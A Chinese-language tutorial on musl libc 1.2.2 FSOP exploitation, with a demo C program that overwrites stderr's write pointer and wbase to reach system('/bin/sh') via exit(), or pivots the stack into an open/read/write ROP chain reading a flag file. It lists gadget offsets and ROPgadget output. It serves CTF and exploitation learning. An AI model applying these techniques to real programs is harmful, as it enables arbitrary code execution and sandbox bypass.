在上一篇文章中，我们详细分析了如何通过musl的内存分配系统实现任意两个地址互相写的利用。本文据此讨论应该如何使用这种方式getshell。

首先看到musl中的`_IO_FILE`结构体：

```c
struct _IO_FILE {
	unsigned flags;
	unsigned char *rpos, *rend;
	int (*close)(FILE *);
	unsigned char *wend, *wpos;
	unsigned char *mustbezero_1;
	unsigned char *wbase;
	size_t (*read)(FILE *, unsigned char *, size_t);
	size_t (*write)(FILE *, const unsigned char *, size_t);
	off_t (*seek)(FILE *, off_t, int);
	unsigned char *buf;
	size_t buf_size;
	FILE *prev, *next;
	int fd;
	int pipe_pid;
	long lockcount;
	int mode;
	volatile int lock;
	int lbf;
	void *cookie;
	off_t off;
	char *getln_buf;
	void *mustbezero_2;
	unsigned char *shend;
	off_t shlim, shcnt;
	FILE *prev_locked, *next_locked;
	struct __locale_struct *locale;
};
```

其中有4个函数指针`close`、`read`、`write`、`seek`。在解题时，标准输入输出的三个`FILE`结构体：`stdin`、`stdout`、`stderr`是我们利用的重点。首先我们需要了解musl的exit函数调用链：

```c
_Noreturn void exit(int code)
{
	__funcs_on_exit();
	__libc_exit_fini();
	__stdio_exit();
	_Exit(code);
}
```

```c
void __stdio_exit(void)
{
	FILE *f;
	for (f=*__ofl_lock(); f; f=f->next) close_file(f);
	close_file(__stdin_used);
	close_file(__stdout_used);
	close_file(__stderr_used);
}
```

```c
static void close_file(FILE *f)
{
	if (!f) return;
	FFINALLOCK(f);
	if (f->wpos != f->wbase) f->write(f, 0, 0);
	if (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);
}
```

> `exit`
> &emsp;&emsp;`__stdio_exit`
> &emsp;&emsp;&emsp;&emsp;`close_file`

可以看到`close_file`中可能会调用三个`FILE`的`write`和`seek`函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将`FILE`结构体开头的几个字节修改为`/bin/sh`，再修改`write`指针的值为`system`，以及修改`f->wpos`、`f->wbase`中其中之一就可以调用到`system("/bin/sh")`。而在有沙箱保护的情况下，还需要通过栈迁移才能进行orw。

由于调用`close_file`时，`rsp`周围的栈环境不受我们控制，因此我们不能使用带有`pop rsp`的gadget。以下是查找带有`mov rsp, xxx`的gadget：

```
root@colin-virtual-machine:~/Desktop/my_how2heap/musl# ROPgadget --binary /lib/x86_64-linux-musl/libc.so | grep "mov rsp"
0x0000000000076b32 : add byte ptr [rax], al ; sub rdx, 8 ; mov rsp, rdx ; jmp rax
0x0000000000022c22 : add dword ptr [rax], eax ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750
0x000000000007571b : add eax, dword ptr [rax] ; mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096
0x000000000004d278 : je 0x4d183 ; mov rsp, r9 ; jmp 0x4d101
0x00000000000789f3 : jg 0x78a1d ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
0x0000000000022c0a : jne 0x22bf0 ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2
0x000000000004d259 : lea ebx, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101
0x000000000004d258 : lea r11, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101
0x000000000004d247 : mov eax, 0xffffffff ; mov rsp, r9 ; jmp 0x4d199
0x00000000000789f2 : mov edi, dword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
0x00000000000789f1 : mov r15, qword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
0x000000000007571d : mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096
0x0000000000022c24 : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750
0x0000000000022c0c : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2
0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]
0x000000000004d25c : mov rsp, r9 ; jmp 0x4d101
0x000000000004d24c : mov rsp, r9 ; jmp 0x4d199
0x0000000000076b38 : mov rsp, rdx ; jmp rax
0x000000000004d246 : sub byte ptr [rax - 1], bh ; mov rsp, r9 ; jmp 0x4d199
0x0000000000076b35 : sub edx, 8 ; mov rsp, rdx ; jmp rax
0x0000000000076b34 : sub rdx, 8 ; mov rsp, rdx ; jmp rax
```

其中注意到`mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]`，由于`write`函数的第一个参数是`FILE`结构体自身，因此这里的`[rdi+0x30]`是我们可以通过提前修改控制的值，这样就能够控制`rsp`的值。同样，后面的`[rdi+0x38]`可以写入ROP链开头的一个gadget的地址，从而开始执行ROP链。这里注意到`[rdi+0x38]`当`rdi`等于`FILE`结构体地址时，0x38的偏移对应的正好就是`wbase`，这样可以在满足判断条件的同时写入gadget地址，一举两得。

总结：
- 在无沙箱时，需要修改`FILE`结构体的3个地方——
	- 起始位置写入`/bin/sh`
	- `f->wpos`、`f->wbase`中其中之一使得二者不等
	- `write`写入`system`函数地址。
- 在有沙箱时，需要修改`FILE`结构体的3个地方——
	- `f->wbase`写入第一个gadget地址使得`f->wpos`、`f->wbase`不等的同时能够执行到gadget
	- `write`写入刚才提到的栈迁移的gadget
	- 偏移0x30处写入新的栈地址配合栈迁移gadget完成栈迁移
	- 此外还需要在其他地方构造好ROP链用于orw

下面笔者编写的demo程序详细演示了两种利用方式的流程，为方便起见，demo中没有通过unlink进行地址写操作，而是直接写。如果使用unlink进行任意地址写，要注意偏移量，两个地址a和b中如果a能够写到b的位置，那么b会写到a+8的位置，对应于两个指针在结构体中的偏移，这一点在上一篇文章中最后打印结果时有体现，不要忽视。

如果执行不成功，请检查自己机器上的musl libc版本是否是1.2.2，若不是，则根据反汇编结果进行偏移量的调整即可。（选择orw模式时需确保当前文件夹中有flag文件）

头文件`musl_util.h`：
```c
#ifndef MY_HOW2HEAP_MUSL_UTIL_H
#define MY_HOW2HEAP_MUSL_UTIL_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

struct _IO_FILE {
    unsigned flags;
    unsigned char *rpos, *rend;
    int (*close)(FILE *);
    unsigned char *wend, *wpos;
    unsigned char *mustbezero_1;
    unsigned char *wbase;
    size_t (*read)(FILE *, unsigned char *, size_t);
    size_t (*write)(FILE *, const unsigned char *, size_t);
    off_t (*seek)(FILE *, off_t, int);
    unsigned char *buf;
    size_t buf_size;
    FILE *prev, *next;
    int fd;
    int pipe_pid;
    long lockcount;
    int mode;
    volatile int lock;
    int lbf;
    void *cookie;
    off_t off;
    char *getln_buf;
    void *mustbezero_2;
    unsigned char *shend;
    off_t shlim, shcnt;
    FILE *prev_locked, *next_locked;
    struct __locale_struct *locale;
};

struct meta {
    struct meta *prev, *next;
    struct group *mem;
    volatile int avail_mask, freed_mask;
    unsigned long long last_idx:5;
    unsigned long long freeable:1;
    unsigned long long sizeclass:6;
    unsigned long long maplen:8*8-12;
};

struct group {
    struct meta *meta;
    unsigned char active_idx:5;
    char pad[0x10 - sizeof(struct meta *) - 1];
    unsigned char storage[];
};

struct meta_area {
    unsigned long long check;
    struct meta_area *next;
    int nslots;
    struct meta slots[];
};

#define BLACK       "30"
#define RED         "31"
#define GREEN       "32"
#define YELLOW      "33"
#define BLUE        "34"
#define PURPLE      "35"
#define GREEN_DARK  "36"
#define WHITE       "37"

#define UNDEFINED   "-"
#define HIGHLIGHT   "1"
#define UNDERLINE   "4"
#define SPARK       "5"

#define STR_END      "\033[0m"

void printf_color(char* color, char* effect, char* string){
    char buffer[0x1000] = {0};
    strcpy(buffer, "\033[");
    if(effect[0] != '-'){
        strcat(buffer, effect);
        strcat(buffer, ";");
    }
    strcat(buffer, color);
    strcat(buffer, "m");
    strcat(buffer, string);
    printf("%s" STR_END, buffer);
}

void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}

#endif //MY_HOW2HEAP_MUSL_UTIL_H
```

c文件`musl_FSOP.c`：
```c
#include "musl_util.h"

#define get_shell 1
#define orw 2
// 重要！在这里修改利用模式
#define mode orw

char* flag = "./flag";
char* bin_sh = "/bin/sh";
size_t enough_space[0x100];
size_t fake_stack[0x40];
char flag_content[0x20];

int main(){
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf_color(GREEN, UNDEFINED, "本程序用于演示musl libc的FSOP利用方式。\n");
    printf_color(GREEN, UNDEFINED, "测试环境：ubuntu 22.04，musl版本：1.2.2。\n");
    printf_color(GREEN, UNDEFINED, "与glibc相似，FSOP也是musl的一种重要的利用方式。\n");
    printf_color(GREEN, UNDEFINED, "下面是musl libc中FILE结构体的定义：\n\n");

    printf_color(YELLOW, HIGHLIGHT, "(/src/internal/stdio_impl.h, line 21)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "struct _IO_FILE {\n"
                 "\tunsigned flags;\n"
                 "\tunsigned char *rpos, *rend;\n"
                 "\t\033[1;31mint (*close)(FILE *);\n" "\033[1;" PURPLE "m"
                 "\tunsigned char *wend, *wpos;\n"
                 "\tunsigned char *mustbezero_1;\n"
                 "\tunsigned char *wbase;\n"
                 "\t\033[1;31msize_t (*read)(FILE *, unsigned char *, size_t);\n" "\033[1;" PURPLE "m"
                 "\t\033[1;31msize_t (*write)(FILE *, const unsigned char *, size_t);\n" "\033[1;" PURPLE "m"
                 "\t\033[1;31moff_t (*seek)(FILE *, off_t, int);\n" "\033[1;" PURPLE "m"
                 "\tunsigned char *buf;\n"
                 "\tsize_t buf_size;\n"
                 "\tFILE *prev, *next;\n"
                 "\tint fd;\n"
                 "\tint pipe_pid;\n"
                 "\tlong lockcount;\n"
                 "\tint mode;\n"
                 "\tvolatile int lock;\n"
                 "\tint lbf;\n"
                 "\tvoid *cookie;\n"
                 "\toff_t off;\n"
                 "\tchar *getln_buf;\n"
                 "\tvoid *mustbezero_2;\n"
                 "\tunsigned char *shend;\n"
                 "\toff_t shlim, shcnt;\n"
                 "\tFILE *prev_locked, *next_locked;\n"
                 "\tstruct __locale_struct *locale;\n"
                 "};\n\n");

    printf_color(GREEN, UNDEFINED, "用红色标出的4行表示4个函数指针，这是我们利用的关键。\n");
    printf_color(GREEN, UNDEFINED, "又注意到exit函数有调用链：exit->__stdio_exit->close_file。\n\n");

    printf_color(YELLOW, HIGHLIGHT, "(/src/stdio/__stdio_exit.c, line 16)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "void __stdio_exit(void)\n"
                 "{\n"
                 "\tFILE *f;\n"
                 "\tfor (f=*__ofl_lock(); f; f=f->next) close_file(f);\n"
                 "\tclose_file(__stdin_used);\n"
                 "\tclose_file(__stdout_used);\n"
                 "\tclose_file(__stderr_used);\n"
                 "}\n\n");

    printf_color(YELLOW, HIGHLIGHT, "(/src/stdio/__stdio_exit.c, line 8)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static void close_file(FILE *f)\n"
                 "{\n"
                 "\tif (!f) return;\n"
                 "\tFFINALLOCK(f);\n"
                 "\tif (f->wpos != f->wbase) f->write(f, 0, 0);\n"
                 "\tif (f->rpos != f->rend) f->seek(f, f->rpos-f->rend, SEEK_CUR);\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "可以看到3个标准IO的FILE结构体都可能会调用write和seek函数。\n");
    printf_color(GREEN, UNDEFINED, "如果能够修改这些函数指针的值，就能够执行任意代码。\n");
    printf_color(GREEN, UNDEFINED, "因此无论如何，首先要做的就是获取libc的基地址。\n");
    printf_color(GREEN, UNDEFINED, "我们就利用stderr标准错误FILE结构体的地址来获取。\n");

    size_t stderr_addr = (size_t)stderr;
    printf_color(GREEN, UNDEFINED, "stderr的地址为：");
    printf("\033[1;31m%#zx\n\033[0m", stderr_addr);
    printf_color(GREEN, UNDEFINED, "stderr在libc中的偏移量为0xAD080。\n");
    size_t libc_base = stderr_addr - 0xAD080;
    printf_color(GREEN, UNDEFINED, "计算得到libc的基地址为：");
    printf("\033[1;31m%#zx\n\n\033[0m", libc_base);

    if(mode == get_shell){
        printf_color(BLUE, HIGHLIGHT, "你选择了get shell模式。\n");
        printf_color(GREEN, UNDEFINED, "在get shell模式中，我们需要修改stderr的3处内容：\n");
        printf_color(RED, HIGHLIGHT, "1. 开头，需修改为字符串\"/bin/sh\"。\n");
        printf_color(RED, HIGHLIGHT, "2. wpos或wbase，使得这两个值不等即可。\n");
        printf_color(RED, HIGHLIGHT, "3. write函数指针，修改为system的地址。\n");

        printf_color(GREEN, UNDEFINED, "需要注意调用write函数时，第一个参数是FILE结构体地址。\n");
        printf_color(GREEN, UNDEFINED, "因此需要在FILE开头写字符串，从而get shell。\n");

        size_t system_addr = (size_t)system;
        printf_color(GREEN, UNDEFINED, "system的地址为：");
        printf("\033[1;31m%#zx\n\033[0m", system_addr);
        strcpy((char*)stderr_addr, "/bin/sh");
        ((FILE*)stderr_addr)->wbase = (unsigned char*)1;
        ((FILE*)stderr_addr)->write = (size_t (*)(FILE*, const unsigned char*, size_t))system_addr;

        printf_color(GREEN, UNDEFINED, "调教完成的stderr：\n");
        print_binary((char*)stderr_addr, sizeof(struct _IO_FILE));

        printf_color(GREEN, UNDEFINED, "最后只需要调用exit函数即可。\n");
        exit(0);
    }else if(mode == orw){
        printf_color(BLUE, HIGHLIGHT, "你选择了orw模式。\n");
        printf_color(GREEN, UNDEFINED, "orw的利用方式较get shell要复杂一些。\n");
        printf_color(GREEN, UNDEFINED, "但对于stderr而言还是只需要修改3个地方：\n");
        printf_color(RED, HIGHLIGHT, "1. 偏移0x30处，修改为修改为新栈的地址。\n");
        printf_color(RED, HIGHLIGHT, "2. wbase，偏移0x38，修改为第一个gadget的地址。\n");
        printf_color(RED, HIGHLIGHT, "3. write函数指针，修改为栈迁移的gadget的地址。\n\n");

        printf_color(GREEN, UNDEFINED, "在偏移0x789F5处有这样一个gadget：\n");
        printf_color(RED, HIGHLIGHT, "0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]\n");
        printf_color(GREEN, UNDEFINED, "考虑到write函数调用的第一个参数为stderr地址，rdi=stderr地址。\n");
        printf_color(GREEN, UNDEFINED, "按照上面的方案修改stderr，可以完美实现栈迁移。\n");

        printf_color(GREEN, UNDEFINED, "准备伪造栈的地址为：");
        printf("\033[1;31m%p\n\033[0m", fake_stack);

        size_t pivot_gadget = libc_base + 0x789F5;
        size_t pop_rdi = libc_base + 0x152A1;
        size_t pop_rsi = libc_base + 0x1B0A1;
        size_t pop_rdx = libc_base + 0x2A50B;

        ((FILE*)stderr_addr)->mustbezero_1 = (unsigned char*)fake_stack;
        ((FILE*)stderr_addr)->wbase = (unsigned char*)pop_rdi;
        ((FILE*)stderr_addr)->write = (size_t (*)(FILE*, const unsigned char*, size_t))pivot_gadget;

        printf_color(GREEN, UNDEFINED, "调教完成的stderr：\n");
        print_binary((char*)stderr_addr, sizeof(struct _IO_FILE));

        printf_color(GREEN, UNDEFINED, "一些有用的gadget：\n");
        printf_color(BLUE, HIGHLIGHT, "pop rdi ; ret : ");
        printf("\033[1;" BLUE "m%#zx\n\033[0m", pop_rdi);
        printf_color(BLUE, HIGHLIGHT, "pop rsi ; ret : ");
        printf("\033[1;" BLUE "m%#zx\n\033[0m", pop_rsi);
        printf_color(BLUE, HIGHLIGHT, "pop rdx ; ret : ");
        printf("\033[1;" BLUE "m%#zx\n\033[0m", pop_rdx);

        fake_stack[0] = (size_t)flag;   // open函数参数1
        fake_stack[1] = pop_rsi;
        fake_stack[2] = 0;              // open函数参数2
        fake_stack[3] = (size_t)open;   // 调用open
        fake_stack[4] = pop_rdi;
        fake_stack[5] = 3;              // read函数参数1
        fake_stack[6] = pop_rsi;
        fake_stack[7] = (size_t) flag_content;  // read函数参数2
        fake_stack[8] = (size_t) pop_rdx;
        fake_stack[9] = 0x20;           // read函数参数3
        fake_stack[10] = (size_t)read;  // 调用open
        fake_stack[11] = pop_rdi;
        fake_stack[12] = 1;             // write函数参数1
        fake_stack[13] = pop_rsi;
        fake_stack[14] = (size_t) flag_content;  // write函数参数2
        fake_stack[15] = (size_t) pop_rdx;
        fake_stack[16] = 0x20;          // write函数参数3
        fake_stack[17] = (size_t)write; // 调用write

        printf_color(GREEN, UNDEFINED, "新栈内容：\n");
        print_binary((char*)fake_stack, 20 * 8);

        printf_color(GREEN, UNDEFINED, "最后只需要调用exit函数即可。\n");
        exit(0);
    }
}
```

当然，在musl libc中FSOP的方法有很多，这里只是演示了其中一种。更多的利用方式还是需要通过多看多做来掌握。
